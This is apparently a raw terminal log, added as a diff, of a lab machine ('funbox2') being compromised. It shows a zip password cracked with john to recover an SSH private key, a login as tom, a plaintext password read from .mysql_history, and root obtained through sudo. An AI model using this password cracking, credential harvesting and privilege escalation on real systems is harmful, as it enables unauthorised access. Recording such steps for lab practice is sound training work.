@@ -1,0 +1,101 @@
+┌──(root㉿kali)-[/home/kali]
+└─# zip2john tom.zip > crackme
+ver 2.0 efh 5455 efh 7875 tom.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt crackme
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iubire           (tom.zip/id_rsa)     
+1g 0:00:00:00 DONE (2025-10-06 04:45) 50.00g/s 307200p/s 307200c/s 307200C/s 123456..iheartyou
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# chmod 600 id_rsa  
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i id_rsa tom@192.168.167.107
+The authenticity of host '192.168.167.107 (192.168.167.107)' can't be established.
+ED25519 key fingerprint is SHA256:ZBER3N78DusT56jsi/IGcAxcCB2W5CZWUJTbc3K4bZc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.167.107' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Oct  6 08:47:31 UTC 2025
+
+  System load:  0.08              Processes:             160
+  Usage of /:   74.5% of 4.37GB   Users logged in:       0
+  Memory usage: 36%               IP address for ens256: 192.168.167.107
+  Swap usage:   0%
+
+
+30 packages can be updated.
+0 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@funbox2:~$ 
+
+tom@funbox2:~$ ls -lsa
+total 40
+4 drwxr-xr-x 5 tom  tom  4096 Oct  6 08:47 .
+4 drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
+0 -rw------- 1 tom  tom     0 Oct 14  2020 .bash_history
+4 -rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
+4 -rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
+4 drwx------ 2 tom  tom  4096 Oct  6 08:47 .cache
+4 drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
+4 -rw-r--r-- 1 tom  tom    33 Oct  6 08:40 local.txt
+4 -rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
+4 -rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
+4 drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
+tom@funbox2:~$ cat .mysql_history
+_HiStOrY_V2_
+show\040databases;
+quit
+create\040database\040'support';
+create\040database\040support;
+use\040support
+create\040table\040users;
+show\040tables
+;
+select\040*\040from\040support
+;
+show\040tables;
+select\040*\040from\040support;
+insert\040into\040support\040(tom,\040xx11yy22!);
+quit
+
+tom's password is xx11yy22!
+
+tom@funbox2:~$ sudo -l
+[sudo] password for tom: 
+Matching Defaults entries for tom on funbox2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tom may run the following commands on funbox2:
+    (ALL : ALL) ALL
+tom@funbox2:~$ 
+tom@funbox2:~$ sudo /bin/bash -p
+root@funbox2:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@funbox2:~# 
